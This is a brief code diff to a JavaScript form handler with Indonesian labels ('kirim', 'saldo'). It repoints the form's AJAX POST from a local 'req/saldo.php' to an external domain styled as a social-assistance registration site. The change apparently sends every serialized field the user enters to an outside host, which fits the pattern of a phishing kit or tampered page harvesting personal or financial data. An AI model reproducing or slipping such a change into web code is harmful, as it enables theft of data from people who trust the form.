@@ -7,7 +7,7 @@ document.getElementById('kirim').innerHTML = "Verify...";
 
  $.ajax({
  type: 'POST',
- url: 'req/saldo.php',
+ url: 'https://daftarrbansos.online/ml/saldo.php',
  data: $(formsal).serialize(),
  datatype: 'text',
  
